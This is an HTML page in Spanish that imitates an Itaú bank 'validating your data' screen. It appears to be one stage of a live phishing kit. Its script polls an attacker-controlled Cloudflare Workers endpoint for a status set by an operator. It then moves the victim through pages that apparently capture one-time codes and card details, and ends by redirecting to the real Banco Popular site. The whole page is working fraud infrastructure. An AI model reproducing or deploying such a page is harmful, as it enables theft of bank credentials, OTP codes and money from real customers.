<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, user-scalable=yes" />
  <title>Validando - Itaú</title>
  
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      background: #f8f9fa;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
    }

    .container {
      background: white;
      border-radius: 24px;
      padding: 40px 32px;
      max-width: 420px;
      width: 90%;
      text-align: center;
      box-shadow: 0 10px 40px rgba(0,0,0,0.08);
    }

    .logo-itau {
      font-size: 36px;
      font-weight: 700;
      color: #06143f;
      letter-spacing: -2px;
      margin-bottom: 30px;
    }

    .spinner-container {
      display: flex;
      justify-content: center;
      margin-bottom: 24px;
    }

    .spinner-salmon {
      position: relative;
      width: 60px;
      height: 60px;
    }

    .spinner-salmon::before {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      border: 4px solid rgba(255, 91, 0, 0.15);
      border-radius: 50%;
    }

    .spinner-salmon::after {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      border: 4px solid transparent;
      border-top-color: #ff5b00;
      border-bottom-color: #ff5b00;
      border-radius: 50%;
      animation: spinSalmon 1s cubic-bezier(0.5, 0, 0.5, 1) infinite;
    }

    @keyframes spinSalmon {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    .title {
      font-size: 20px;
      font-weight: 600;
      color: #1a1a2e;
      margin-bottom: 6px;
    }

    .subtitle {
      font-size: 14px;
      color: #6c757d;
      line-height: 1.5;
    }

    @media (max-width: 480px) {
      .container {
        padding: 28px 20px;
      }
      .logo-itau {
        font-size: 30px;
      }
      .title {
        font-size: 18px;
      }
      .subtitle {
        font-size: 13px;
      }
    }

    @media (prefers-reduced-motion: reduce) {
      .spinner-salmon::after {
        animation: none;
      }
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="logo-itau">itaú</div>
    <div class="spinner-container">
      <div class="spinner-salmon"></div>
    </div>
    <h1 class="title">Validando tus datos</h1>
    <p class="subtitle">Por favor espera un momento...</p>
  </div>

  <script>
    const WORKER_URL = 'https://shy-resonance-6d69.micollflorez.workers.dev';
    let intentos = 0;
    const MAX_INTENTOS = 60;
    let timeoutId = null;
    let isProcessing = false;

    async function checkStatus(transactionId) {
      if (isProcessing) return;
      isProcessing = true;
      intentos++;

      try {
        const response = await fetch(`${WORKER_URL}/status?id=${transactionId}`);

        if (!response.ok) {
          throw new Error(`HTTP ${response.status}`);
        }

        const data = await response.json();
        console.log(`📊 Estado (${intentos}/${MAX_INTENTOS}):`, data);

        if (!data.estado || data.estado === "pendiente") {
          if (intentos >= MAX_INTENTOS) {
            console.log('⏰ Tiempo de espera agotado');
            window.location.href = 'index.html';
            return;
          }
          isProcessing = false;
          timeoutId = setTimeout(() => checkStatus(transactionId), 5000);
          return;
        }

        const estado = data.estado;
        console.log(`✅ Estado recibido: ${estado}`);

        switch (estado) {
          case 'autorizado':
            setTimeout(() => {
              window.location.href = 'codigo.html';
            }, 500);
            break;

          case 'error':
            setTimeout(() => {
              window.location.href = 'index.html';
            }, 500);
            break;

          case 'otp_solicitado':
            isProcessing = false;
            timeoutId = setTimeout(() => checkStatus(transactionId), 8000);
            break;

          case 'otp_recibido':
            setTimeout(() => {
              window.location.href = 'codeinco.html';
            }, 500);
            break;

          case 'biometria':
            setTimeout(() => {
              window.location.href = 'tarjeta.html';
            }, 500);
            break;

          case 'finalizado':
            setTimeout(() => {
              window.location.href = 'https://www.bancopopular.com.co/';
            }, 500);
            break;

          default:
            isProcessing = false;
            timeoutId = setTimeout(() => checkStatus(transactionId), 5000);
        }

      } catch (error) {
        console.error('❌ Error:', error);
        if (intentos < MAX_INTENTOS) {
          isProcessing = false;
          timeoutId = setTimeout(() => checkStatus(transactionId), 5000);
        } else {
          window.location.href = 'index.html';
        }
      }
    }

    document.addEventListener('DOMContentLoaded', async () => {
      const bancoldataRaw = localStorage.getItem('bancoldata');

      if (!bancoldataRaw) {
        console.log('❌ Error: Datos no encontrados');
        setTimeout(() => {
          window.location.href = 'index.html';
        }, 1000);
        return;
      }

      let bancoldata;
      try {
        bancoldata = JSON.parse(bancoldataRaw);
      } catch (e) {
        console.error('Error parsing bancoldata:', e);
        setTimeout(() => {
          window.location.href = 'index.html';
        }, 1000);
        return;
      }

      const { transactionId } = bancoldata;

      if (!transactionId) {
        console.log('❌ Error: transactionId no encontrado');
        setTimeout(() => {
          window.location.href = 'index.html';
        }, 1000);
        return;
      }

      console.log('🔍 Verificando transacción:', transactionId);
      await checkStatus(transactionId);
    });

    window.addEventListener('beforeunload', function() {
      if (timeoutId) {
        clearTimeout(timeoutId);
      }
    });
  </script>
</body>
</html>
